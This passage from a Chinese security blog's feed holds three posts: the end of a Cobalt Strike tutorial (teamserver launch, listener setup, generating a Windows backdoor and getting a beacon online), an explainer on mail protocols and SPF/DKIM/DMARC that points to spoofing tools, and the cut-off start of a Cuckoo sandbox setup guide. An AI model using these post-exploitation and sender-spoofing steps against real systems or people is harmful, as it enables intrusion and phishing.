title="启动团队服务器"></a>启动团队服务器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 777 teamserver                       <span class="hljs-comment">#如teamserver没权限需要赋予权限</span><br>./teamserver  团队服务器ip  密码            <span class="hljs-comment">#密码是客户端连接团队服务器需要提供的密码</span><br><br>For Example：<br>./teamserver 192.168.230.148 123456            <span class="hljs-comment">#建议公网不要采用弱密码</span><br></code></pre></td></tr></table></figure><img src="image-20220426142418722.png" alt="image-20220426142418722" style="zoom: 67%;" /><p>针对teamserver的特征隐藏下面再讲。</p><h3 id="启动客户端连接"><a href="#启动客户端连接" class="headerlink" title="启动客户端连接"></a>启动客户端连接</h3><p>Windows中，运行start.bat；Linux中，运行start.sh</p><p>或者</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">java -<span class="hljs-variable constant_">XX</span><span class="hljs-symbol">:+AggressiveHeap</span> -<span class="hljs-variable constant_">XX</span><span class="hljs-symbol">:+UseParallelGC</span> -jar cobaltstrike.jar<br></code></pre></td></tr></table></figure><p>输入团队服务器ip、端口、用户名（随意）、密码（上面设置的密码），点击“连接”。</p><img src="image-20220426143150725.png" alt="image-20220426143150725" style="zoom:67%;" /><p>出现指纹校验对话框，显示服务端SSL 证书的SHA256哈希值，每次创建Cobalt Strike团队服务器时生成的指纹都不一样，请确认它是否和你的服务端启动时显示的指纹相匹配，以防止中间人攻击。Cobalt Strike还会记住这个SHA256哈希，方便以后连接。点击 “是” 。</p><img src="image-20220426143558578.png" alt="image-20220426143558578" style="zoom:67%;" /><p>进入操作界面，Cobalt Strike就启动成功了。</p><img src="image-20220426143640053.png" alt="image-20220426143640053" style="zoom: 67%;" /><h2 id="Cobalt-Strike-Client界面功能"><a href="#Cobalt-Strike-Client界面功能" class="headerlink" title="Cobalt Strike Client界面功能"></a>Cobalt Strike Client界面功能</h2><p>Cobalt Strike Client界面分为两部分，界面的顶部是会话或目标的视觉化展示，底部展示了与之交互的Cobalt Strike功能或会话的标签页。可以点击这两部分之间的区域调整这两个区域的大小。</p><h3 id="菜单栏"><a href="#菜单栏" class="headerlink" title="菜单栏"></a>菜单栏</h3><p><strong>Cobalt Strike</strong></p><table><thead><tr><th>New Connection</th><th>创建新连接，加入服务端</th></tr></thead><tbody><tr><td>Preferences</td><td>偏好设置，设置界面样式</td></tr><tr><td>Visualization</td><td>视图模式，包括<strong>Pivot Graph</strong>、<strong>Session Table</strong>、<strong>Target Table</strong>三种</td></tr><tr><td>VPN Interfaces</td><td>VPN接口管理</td></tr><tr><td>Listenrs</td><td>监听器管理</td></tr><tr><td>Script Manager</td><td>脚本管理</td></tr></tbody></table><p><strong>View</strong>-视图</p><table><thead><tr><th>Applications</th><th>靶机的应用信息</th></tr></thead><tbody><tr><td>Credentials</td><td>查看从靶机获取的账户密码</td></tr><tr><td>Downloads</td><td>查看从靶机下载的文件</td></tr><tr><td>Event Log</td><td>事件日志，可用于团队聊天</td></tr><tr><td>Keystrokes</td><td>键盘记录</td></tr><tr><td>Proxy Pivots</td><td>查看代理</td></tr><tr><td>Screenshots</td><td>查看屏幕截图</td></tr><tr><td>Script Console</td><td>脚本控制台，用于加载脚本</td></tr><tr><td>Targets</td><td>显示目标靶机</td></tr><tr><td>Web Log</td><td>Web日志</td></tr></tbody></table><p><strong>Attacks</strong>-攻击</p><table><thead><tr><th>Packages</th><th>生成各种后门，包括HTA、OFFICE宏病毒、多种语言的Payload、EXE木马等</th></tr></thead><tbody><tr><td>Web Drive-by</td><td>Web服务配置与管理，包括管理Web服务、克隆网站、开启Web服务供下载文件等</td></tr><tr><td>Spear Phish</td><td>鱼叉式攻击</td></tr></tbody></table><p><strong>Reporting</strong>-报告</p><table><thead><tr><th>Activity report</th><th>生成操作报告</th></tr></thead><tbody><tr><td>Hosts report</td><td>生成主机报告</td></tr><tr><td>Indicators of Compromise</td><td>生成威胁报告</td></tr><tr><td>Sessions report</td><td>生成会话报告</td></tr><tr><td>Social engineering report</td><td>生成社会工程学报告</td></tr><tr><td>Tactics, Techniques, and Procedures</td><td>生成策略、技巧和程序报告</td></tr><tr><td>Reset Data</td><td>重置数据</td></tr><tr><td>Export Data</td><td>导出数据</td></tr></tbody></table><h3 id="工具栏"><a href="#工具栏" class="headerlink" title="工具栏"></a>工具栏</h3><img src="工具栏.png" alt="工具栏" style="zoom:50%;" /><h3 id="可视化展示"><a href="#可视化展示" class="headerlink" title="可视化展示"></a>可视化展示</h3><p>Cobalt Strike提供三种可视化展示，包括<strong>Pivot Graph</strong>、<strong>Session Table</strong>、<strong>Target Table</strong>，可以通过工具栏的<em>Cobalt Strike</em> → <em>Visualization</em> 在不同的可视化形式之间切换。</p><h4 id="Pivot-Graph-拓扑图模式"><a href="#Pivot-Graph-拓扑图模式" class="headerlink" title="Pivot Graph(拓扑图模式)"></a>Pivot Graph(拓扑图模式)</h4><p>可以很清楚地查看各主机之间的关系，该视图在大规模内网渗透和APT中非常直观和实用。</p><img src="image-20220429135321016.png" alt="image-20220429135321016" style="zoom:80%;" /><h4 id="Session-Table-会话列表模式"><a href="#Session-Table-会话列表模式" class="headerlink" title="Session Table(会话列表模式)"></a>Session Table(会话列表模式)</h4><p>这个视图是我们渗透测试中最为常用的，它主要显示的是当前所有的会话，会话的权限，会话运行在目标机上的pid等等</p><p><img src="/2022/04/29/Cobalt-Strike%E5%AD%A6%E4%B9%A0/image-20220429135403998.png"></p><h4 id="Target-Table-目标列表模式"><a href="#Target-Table-目标列表模式" class="headerlink" title="Target Table(目标列表模式)"></a>Target Table(目标列表模式)</h4><p>显示在beacon中执行主机存活扫描&#x2F;端口扫描后探测出的存活的主机。</p><p><img src="/2022/04/29/Cobalt-Strike%E5%AD%A6%E4%B9%A0/image-20220429135452128.png" alt="image-20220429135452128"></p><h2 id="Cobalt-Strike使用"><a href="#Cobalt-Strike使用" class="headerlink" title="Cobalt Strike使用"></a>Cobalt Strike使用</h2><h3 id="监听器listener"><a href="#监听器listener" class="headerlink" title="监听器listener"></a>监听器listener</h3><p>通过 <em>Cobalt Strike</em> → <em>Listeners</em> 打开监听器标签页，这里会列举出所有配置的监听器，并可以对监听器进行管理。</p><img src="image-20220429141619873.png" alt="image-20220429141619873" style="zoom:80%;" /><p>选择<em>Add</em>，添加一个监听器。</p><img src="image-20220429141743364.png" alt="image-20220429141743364" style="zoom:67%;" /><p>监听器分为</p><p><strong>内部的Listener</strong></p><ol><li>Beacon DNS</li><li>Beacon HTTP</li><li>Beacon HTTPS</li><li>Beacon SMB</li><li>Beacon TCP</li></ol><p><strong>内部的Listener</strong></p><ol><li>External C2</li><li>Foreign HTTP</li><li>Foreign HTTPS</li></ol><p>如下创建一个HTTP监听器。</p><img src="image-20220429142800393.png" alt="image-20220429142800393" style="zoom:67%;" /><h3 id="创建攻击Attacks"><a href="#创建攻击Attacks" class="headerlink" title="创建攻击Attacks"></a>创建攻击Attacks</h3><h4 id="Packages生成后门"><a href="#Packages生成后门" class="headerlink" title="Packages生成后门"></a>Packages生成后门</h4><p>Packages生成的后门包括：</p><table><thead><tr><th>HTML Application</th><th>生成一个恶意HTML Application木马，后缀格式为 .hta。</th></tr></thead><tbody><tr><td>MS Office Macro</td><td>生成office宏病毒文件</td></tr><tr><td>Payload Generator</td><td>生成各种语言版本（C、C#、COM Scriptlet、Java等）的payload</td></tr><tr><td>Windows Executable</td><td>生成32位或64位的exe和基于服务的exe、DLL等后门程序</td></tr><tr><td>Windows Executable(S)</td><td>生成exe、DLL等后门程序，其中包含Beacon的完整payload，不需要阶段性的请求。</td></tr></tbody></table><p>如下生成一个32位Windows Executable。选择刚创建的监听器，点击<em>Generate</em>，保存生成的后门文件。</p><img src="image-20220429143810603.png" alt="image-20220429143810603" style="zoom: 80%;" /><img src="image-20220429144651928.png" alt="image-20220429144651928" style="zoom:80%;" /><h3 id="Beacon上线"><a href="#Beacon上线" class="headerlink" title="Beacon上线"></a>Beacon上线</h3><p>将生成的后门程序拷贝到受控主机上，点击运行。Cobalt Strike上线成功。</p><p>默认sleep为60s，可以通过右键对象 → <em>会话</em> → <em>Sleep…</em> 修改。</p><img src="image-20220429144923834.png" alt="image-20220429144923834" style="zoom:67%;" /><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf">https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf</a><br><a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/welcome_main.htm#_Toc65482705">https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/welcome_main.htm#_Toc65482705</a></p>]]></content>
    
    
    <categories>
      
      <category>基础知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Cobalt Strike</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于邮件的那点事</title>
    <link href="/2022/04/24/%E5%85%B3%E4%BA%8E%E9%82%AE%E4%BB%B6%E7%9A%84%E9%82%A3%E7%82%B9%E4%BA%8B/"/>
    <url>/2022/04/24/%E5%85%B3%E4%BA%8E%E9%82%AE%E4%BB%B6%E7%9A%84%E9%82%A3%E7%82%B9%E4%BA%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="三种邮件协议"><a href="#三种邮件协议" class="headerlink" title="三种邮件协议"></a>三种邮件协议</h2><h3 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP"></a>SMTP</h3><p>即“Simple Mail Transfer Protocol”，简单邮件传输协议。它是用于从源地址到目标地址传输邮件的规范。通过该协议来控制邮件的中转。而我们常用的邮件供应商所提供的邮件服务，基本都是采用的SMTP协议进行传输。要注意的是SMTP协议并没有要求了客户端连接服务器需要进行认证，而<strong>ESMTP</strong> （Extended SMTP）会要求用户提供用户名和密码以便验证身份。但是它也仅仅只要求了客户端需要与服务端进行认证，服务器之间传输邮件的过程是不需要进行认证的。（<strong>发送、中转邮件</strong>）</p><h3 id="POP3"><a href="#POP3" class="headerlink" title="POP3"></a>POP3</h3><p>即“Post Office Protocol - Version 3”，邮局协议版本3。主要用于支持使用客户端远程管理在服务器上的电子邮件。（<strong>接收邮件</strong>）</p><h3 id="IMAP"><a href="#IMAP" class="headerlink" title="IMAP"></a>IMAP</h3><p>即“Internet Mail Access Protocol”，网际消息访问协议。它不同于POP3，POP3协议并不会将客户端对邮件进行的操作同步至服务器。当使用IMAP协议与邮件服务器交互的时候，你在客户端对邮件进行的操作都会同步到服务器上，所以IMAP也叫做交互式邮件存取协议。（<strong>接收、管理邮件</strong>）</p><h3 id="POP3和IMAP的区别："><a href="#POP3和IMAP的区别：" class="headerlink" title="POP3和IMAP的区别："></a>POP3和IMAP的区别：</h3><ol><li>IMAP提供<strong>Webmail</strong>与电子邮件客户端之间的双向通信，客户端收取的邮件仍然保留在服务器上，同时在客户端上的操作都会反馈到服务器上；而POP3在<strong>客户端</strong>的操作不会反馈到服务器上。</li><li>POP3需要下载未阅读的邮件，IMAP可以不用把所有的邮件全部下载，而是通过客户端直接对服务器上的邮件进行操作。</li></ol><p>一般邮件<strong>客户端使用POP3，浏览器使用IMAP</strong>。<strong>IMAP协议更优</strong>。</p><h2 id="常见邮件端口"><a href="#常见邮件端口" class="headerlink" title="常见邮件端口"></a>常见邮件端口</h2><table><thead><tr><th align="center">端口</th><th align="center">协议</th><th align="center">备注</th></tr></thead><tbody><tr><td align="center">25</td><td align="center">SMTP</td><td align="center"></td></tr><tr><td align="center">465</td><td align="center">SMTPS(SMTP SSL)</td><td align="center"></td></tr><tr><td align="center">587</td><td align="center">SMTP-MSA(Message submission agent)</td><td align="center">接受来自电子邮件客户端（MUA）的电子邮件提交</td></tr><tr><td align="center">109</td><td align="center">POP2</td><td align="center">已淘汰</td></tr><tr><td align="center">110</td><td align="center">POP3</td><td align="center"></td></tr><tr><td align="center">143</td><td align="center">IMAP</td><td align="center"></td></tr><tr><td align="center">993</td><td align="center">IMAPS(IMAP SSL)</td><td align="center"></td></tr><tr><td align="center">995</td><td align="center">POP3(POP3 SSL)</td><td align="center"></td></tr></tbody></table><h2 id="邮件的基础信息"><a href="#邮件的基础信息" class="headerlink" title="邮件的基础信息"></a>邮件的基础信息</h2><p>大部分邮箱都有可以查看邮件原文</p><p>163邮箱：</p><p><img src="/2022/04/24/%E5%85%B3%E4%BA%8E%E9%82%AE%E4%BB%B6%E7%9A%84%E9%82%A3%E7%82%B9%E4%BA%8B/image-20220424144936243.png" alt="image-20220424144936243"></p><p>QQ邮箱：</p><p><img src="/2022/04/24/%E5%85%B3%E4%BA%8E%E9%82%AE%E4%BB%B6%E7%9A%84%E9%82%A3%E7%82%B9%E4%BA%8B/image-20220424145047436.png" alt="image-20220424145047436"></p><p>邮件原文如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs sql">Received: <span class="hljs-keyword">from</span> mail<span class="hljs-operator">-</span>m975.mail<span class="hljs-number">.163</span>.com (mail<span class="hljs-operator">-</span>m975.mail<span class="hljs-number">.163</span>.com [<span class="hljs-number">123.126</span><span class="hljs-number">.97</span><span class="hljs-number">.5</span>])<br><span class="hljs-keyword">by</span> newxmmxszb58.qq.com (NewMX) <span class="hljs-keyword">with</span> SMTP id <span class="hljs-number">4341</span>FA5A<br><span class="hljs-keyword">for</span> <span class="hljs-operator">&lt;</span>test<span class="hljs-variable">@qq</span>.com<span class="hljs-operator">&gt;</span>; Mon, <span class="hljs-number">24</span> Apr <span class="hljs-number">2021</span> <span class="hljs-number">14</span>:<span class="hljs-number">16</span>:<span class="hljs-number">52</span> <span class="hljs-operator">+</span><span class="hljs-number">0800</span><br>X<span class="hljs-operator">-</span>QQ<span class="hljs-operator">-</span>mid: xmmxszb58t1650561012tfafucpdm<br>X<span class="hljs-operator">-</span>QQ<span class="hljs-operator">-</span>XMAILINFO: <span class="hljs-number">1</span>NEeXPJF8oqVglPRWfD<span class="hljs-operator">+</span>IaWZM3KAzHEIgcKYKTwZjH0D3X2ette<span class="hljs-operator">+</span><span class="hljs-operator">+</span>rR9aITd4eQ8yDI<br> nqZC4OWwLpkDnxga4ogEZQhoDB6bJwSxUt39<span class="hljs-operator">/</span>ENfSD96hPhfSTN7EZDWstEVzXMoZ2hAdHWjQzHx<br> ckYexp240u9jS7NPp9TD5RwMrur0wf<span class="hljs-operator">+</span>duSqz6l<span class="hljs-operator">+</span>mYLVlIhFOWXSQM4H0f<span class="hljs-operator">/</span>l4oJlKdfTv6UJTCNoH<br> <span class="hljs-number">9</span>D2qEUKhQWEcwKqU1MNxz<span class="hljs-operator">/</span>LAtP066xOyOjO7lgLi3i13mun7I6FN5XMNxlzyZ1MaGK<span class="hljs-operator">+</span>apacc5n7Lb<br> ZQNEpGDQlPJRrm<span class="hljs-operator">/</span>hkkHuw8p6OBnWfdn7JOLPawwo6G4MTtTVr0KrAUJfnVEwYlwefMuaUP9bDl9a<br> OmK63<span class="hljs-operator">/</span>LWVHWYHIcHbYRjO5jrHCidRakp9Y3L<span class="hljs-operator">/</span><span class="hljs-operator">/</span>QYelwCMnHcBGsBlaQmtCHpXqypD4lwmCy9DV<br> <span class="hljs-number">1</span>N6ZHGho7QMrZwukOivZJaduRE<span class="hljs-operator">+</span>GxjKNcPgnndzZ1JxXk2SOY3uDe6E4cAt35lP8oXZlsY<span class="hljs-operator">/</span>WmqEk<br> JyyxnQ<span class="hljs-operator">+</span>ae0TNsnimf5XNvgf7nNKh3QBpPNAqcpcX<span class="hljs-operator">/</span>ZyfKN2a0ilv9dYIDdDK<span class="hljs-operator">+</span>fvn2s3S7yU56Kg<br> d2i<span class="hljs-operator">/</span>oqpuKGhMcjc1dtfGsPUBbJPeZ4s4n0Uulk13JQ8<span class="hljs-operator">/</span>I9eQYnX8pfTKKQtOU58YDCdsB1ldK<br> Lf69wz9eZkOCmdblg7CiKWBYyEP3KH3M3rn5CMV3nUBkzAa9HeD8K<span class="hljs-operator">/</span>nhzy22W6b7VvPpoerPQZlz<br> mkalKUtE0Vehm3mRjaPxFS76wltuS<span class="hljs-operator">+</span>rZDNZdCGCsq87EGAx3rufnU<span class="hljs-operator">/</span>VUGnstEGAXaEkRVQQNvYlR<br> t4dLhAPmyloPkRVrfm2phqcMX1sinOCYsdbGly104lAmuAYvcwjlj2OjKcdnuImHHvZvn<span class="hljs-operator">/</span><span class="hljs-number">9</span>c6k7o<br> <span class="hljs-number">7</span>XsYqUau4PE2iBXFQiW6XWB8grGkrhfZA08UmCOfcX<span class="hljs-operator">+</span>K8b6yF4duYz2NwlClRSLJMmOwxeLJowwt<br> Ar8mrXQqSc2qT4q96fd2lJ9FeFglMUr4Ks8wfwg2o<span class="hljs-operator">=</span><br>DKIM<span class="hljs-operator">-</span>Signature: v<span class="hljs-operator">=</span><span class="hljs-number">1</span>; a<span class="hljs-operator">=</span>rsa<span class="hljs-operator">-</span>sha256; c<span class="hljs-operator">=</span>relaxed<span class="hljs-operator">/</span>relaxed; d<span class="hljs-operator">=</span><span class="hljs-number">163.</span>com;<br>s<span class="hljs-operator">=</span>s110527; h<span class="hljs-operator">=</span><span class="hljs-keyword">from</span>:subject:Message<span class="hljs-operator">-</span>Id:<span class="hljs-type">Date</span>; bh<span class="hljs-operator">=</span><span class="hljs-number">47</span>DEQpj8HBSa<span class="hljs-operator">+</span><span class="hljs-operator">/</span>TImW<br><span class="hljs-operator">+</span><span class="hljs-number">5</span>JCeuQeRkm5NMpJWZG3hSuFU<span class="hljs-operator">=</span>; b<span class="hljs-operator">=</span>Kn0WpC2fucvFEITjTBzH0DMH<span class="hljs-operator">/</span>w3ZnZW<span class="hljs-operator">/</span>GO<br>gAL2NJ5irkDwC38UJSmLy5dcL2rBz4end0AI0tExHAdyH<span class="hljs-operator">+</span>nSOwad5EzbLC5z6<span class="hljs-operator">/</span>zL<br>y2jlOxNKoviahCyJX1SZkx7ojGSKXWxDoAEGWjzTAj3PhdEaXvO4Ky3pprqlmqAk<br>XHM2Yj9ec<span class="hljs-operator">=</span><br>Received: <span class="hljs-keyword">from</span> <span class="hljs-number">163</span> (<span class="hljs-literal">unknown</span> [<span class="hljs-number">125.133</span><span class="hljs-number">.194</span><span class="hljs-number">.12</span>])<br><span class="hljs-keyword">by</span> smtp5 (Coremail) <span class="hljs-keyword">with</span> SMTP id WHdxpCgAHrJEg66Rix6upg<span class="hljs-comment">--.2754752;</span><br>Mon, <span class="hljs-number">24</span> Apr <span class="hljs-number">2021</span> <span class="hljs-number">14</span>:<span class="hljs-number">16</span>:<span class="hljs-number">30</span> <span class="hljs-operator">+</span><span class="hljs-number">0800</span> (CST)<br><span class="hljs-keyword">from</span>: <span class="hljs-operator">&lt;</span>test<span class="hljs-variable">@163</span>.com<span class="hljs-operator">&gt;</span><br><span class="hljs-keyword">to</span>: <span class="hljs-operator">&lt;</span>test<span class="hljs-variable">@qq</span>.com<span class="hljs-operator">&gt;</span><br>subject: this <span class="hljs-keyword">is</span> a subject<br><span class="hljs-number">123</span><br>X<span class="hljs-operator">-</span>CM<span class="hljs-operator">-</span>TRANSID:HdxpCgddAHVJEg62Rix6upCg<span class="hljs-comment">--.27507S2</span><br>Message<span class="hljs-operator">-</span>Id:<span class="hljs-operator">&lt;</span><span class="hljs-number">626413243</span>B51.B4E4C<span class="hljs-number">.1381</span><span class="hljs-variable">@mail</span><span class="hljs-operator">-</span>m975.mail<span class="hljs-number">.163</span>.com<span class="hljs-operator">&gt;</span><br>X<span class="hljs-operator">-</span>Coremail<span class="hljs-operator">-</span>Antispam: <span class="hljs-number">1</span>Uf129KBjeUn29KB7ZKAUJUUUUU529EdanIcx71UUUUU7v73<br>VFW2AGmfu7123jm3AaLaJ3U3IYCTnIWIevJa73UjIFyTuYv333Dg18DUUUU<br>X<span class="hljs-operator">-</span>Originating<span class="hljs-operator">-</span>IP: [<span class="hljs-number">125.133</span><span class="hljs-number">.194</span><span class="hljs-number">.12</span>]<br><span class="hljs-type">Date</span>: Mon, <span class="hljs-number">24</span> Apr <span class="hljs-number">2021</span> <span class="hljs-number">14</span>:<span class="hljs-number">16</span>:<span class="hljs-number">51</span> <span class="hljs-operator">+</span><span class="hljs-number">0800</span> (CST)<br>X<span class="hljs-operator">-</span>CM<span class="hljs-operator">-</span>SenderInfo: xdqr05tpbxqidywtou0bp<span class="hljs-operator">/</span>xtbBrRLsU175e3K11gAAsi<br><br></code></pre></td></tr></table></figure><p><strong>使用telnet发送邮件</strong></p><img src="屏幕截图 2022-04-24 141829.png" alt="屏幕截图 2022-04-24 141829" style="zoom:50%;" /><p><strong>常见邮件属性</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Mail From:</span>                 <span class="hljs-comment">#发件人，一般在收件人方不显示</span><br><span class="hljs-attr">Rcpt to:</span>                   <span class="hljs-comment">#收件人，一般在收件人方不显示</span><br><span class="hljs-attr">Received:</span>                  <span class="hljs-comment">#表示路由信息，记录了邮件传递过程</span><br><span class="hljs-attr">Sender:</span>                    <span class="hljs-comment">#代发用户</span><br><span class="hljs-attr">DKIM-Signature:</span>            <span class="hljs-comment">#DKIM签名</span><br><span class="hljs-attr">From:</span>                      <span class="hljs-comment">#data中的发件人           </span><br><span class="hljs-attr">To:</span>                        <span class="hljs-comment">#data中的收件人</span><br><span class="hljs-attr">Subject:</span>                   <span class="hljs-comment">#主题</span><br><span class="hljs-attr">Authentication-Results:</span>    <span class="hljs-comment">#认证结果</span><br></code></pre></td></tr></table></figure><p>一般情况下Mail From一定为登陆的邮箱账户，各个邮件服务商都会检验；Rcpt to为邮件的真实收件人。</p><p>From和TO是DATA中的数据，可以修改，但是正规邮件服务商（例如163等）会对From进行校验。</p><p>常用的邮件伪造工具<a href="http://www.jetmore.org/john/code/swaks/">Swaks</a>（Kali自带）</p><p>在线：<a href="https://emkei.cz/">https://emkei.cz/</a></p><h2 id="邮箱的验证机制"><a href="#邮箱的验证机制" class="headerlink" title="邮箱的验证机制"></a>邮箱的验证机制</h2><h3 id="SPF"><a href="#SPF" class="headerlink" title="SPF"></a>SPF</h3><p>即“Sender Policy Framework”，发送方策略框架。是一种以IP地址认证电子邮件发件人身份的技术，是非常高效的垃圾邮件解决方案。相对于其他两种验证方式，SPF验证在邮箱分辨垃圾邮件的权重<strong>最高</strong>，<strong>发件人伪造主要是如何绕过SPF记录</strong>。</p><p>接收邮件方会首先检查域名的SPF记录，来确定发件人的IP地址是否被包含在SPF记录里面，如果在，就认为是一封正确的邮件，否则会认为是一封伪造的邮件进行退回。</p><p><img src="/2022/04/24/%E5%85%B3%E4%BA%8E%E9%82%AE%E4%BB%B6%E7%9A%84%E9%82%A3%E7%82%B9%E4%BA%8B/image-20220424151500716.png" alt="image-20220424151500716"></p><h3 id="DKIM"><a href="#DKIM" class="headerlink" title="DKIM"></a>DKIM</h3><p>即“DomainKeys Identified Mail”，域名密钥识别邮件标准。</p><p>邮件发送服务器会为发出的每一封邮件添加数字签名，接收服务器会请求DKIM域名下的公钥，通过该公钥来验证邮件是否真实，以及在传输过程中是否被伪造或更改。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">DKIM-Signature: <span class="hljs-attribute">v</span>=1; <span class="hljs-attribute">a</span>=rsa-sha256; <span class="hljs-attribute">c</span>=relaxed/relaxed; <span class="hljs-attribute">d</span>=163.com;<br><span class="hljs-attribute">s</span>=s110527; <span class="hljs-attribute">h</span>=from:subject:Message-Id:Date; <span class="hljs-attribute">bh</span>=47DEQpj8HBSa+/TImW<br>+<span class="hljs-attribute">5JCeuQeRkm5NMpJWZG3hSuFU</span>=; <span class="hljs-attribute">b</span>=Kn0WpC2fucvFEITjTBzH0DMH/w3ZnZW/GO<br>gAL2NJ5irkDwC38UJSmLy5dcL2rBz4end0AI0tExHAdyH+nSOwad5EzbLC5z6/zL<br>y2jlOxNKoviahCyJX1SZkx7ojGSKXWxDoAEGWjzTAj3PhdEaXvO4Ky3pprqlmqAk<br>XHM2Yj9ec=<br></code></pre></td></tr></table></figure><h3 id="DMARC"><a href="#DMARC" class="headerlink" title="DMARC"></a>DMARC</h3><p>即“ Domain-based Message Authentication, Reporting and Conformance”，基于域名的消息身份验证、报告和一致性。基于SPF和DKIM，检查SPF和DKIM是否通过，如果不通过时怎么做。</p><h3 id=""><a href="#" class="headerlink" title=""></a><img src="/2022/04/24/%E5%85%B3%E4%BA%8E%E9%82%AE%E4%BB%B6%E7%9A%84%E9%82%A3%E7%82%B9%E4%BA%8B/dmarc.png" alt="img"></h3><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/articles/network/327768.html">https://www.freebuf.com/articles/network/327768.html</a></p><p><a href="https://bbs.ichunqiu.com/thread-55388-1-1.html">https://bbs.ichunqiu.com/thread-55388-1-1.html</a></p>]]></content>
    
    
    <categories>
      
      <category>基础知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>邮件</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>搭建简单的Cuckoo沙箱</title>
    <link href="/2022/04/19/%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E7%9A%84Cuckoo%E6%B2%99%E7%AE%B1/"/>
    <url>/2022/04/19/%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E7%9A%84Cuckoo%E6%B2%99%E7%AE%B1/</url>
    
    <content type="html"><![CDATA[<p>碰见一个厂商的沙箱设备直接拿来cuckoo的web界面，明目张胆啊</p><p>虽然国内很多厂商的沙箱都是基于开源的cuckoo进行二次开发的</p><p>去年（21年）4月Cuckoo Sandbox 2.x已经不维护了，确实都这么多年了，各种包也老了，至今都不支持python3。说是要完全重写，也不知道要等到什么时候。</p><p>重温一下搭建过程吧</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/cuckoosandbox/cuckoo">https://github.com/cuckoosandbox/cuckoo</a></p><p><a href="https://docs.cuckoosandbox.org/en/latest/">https://docs.cuckoosandbox.org/en/latest/</a></p><p><a href="https://blog.csdn.net/qq_38990949/article/details/103336089">https://blog.csdn.net/qq_38990949/article/details/103336089</a></p><p><a href="https://blog.csdn.net/m0_46687377/article/details/122047047">https://blog.csdn.net/m0_46687377/article/details/122047047</a></p><h2 id="Host配置"><a href="#Host配置" class="headerlink" title="Host配置"></a>Host配置</h2><h3 id="在Vmware中安装Ubuntu系统"><a href="#在Vmware中安装Ubuntu系统" class="headerlink" title="在Vmware中安装Ubuntu系统"></a>在Vmware中安装Ubuntu系统</h3><p><a href="http://releases.ubuntu.com/16.04/">Ubuntu下载</a>推荐使用 16.04</p><p>VMware安装Ubuntu时建议内存、处理器、硬盘设置大一点（尤其是硬盘，后期扩盘很麻烦）。</p><h3 id="修改源"><a href="#修改源" class="headerlink" title="修改源"></a>修改源</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo gedit /etc/apt/sources.list<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs awk">deb-src http:<span class="hljs-regexp">//</span>archive.ubuntu.com/ubuntu xenial main restricted<br>deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial main restricted<br>deb-src http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial main restricted multiverse universe<br>deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> 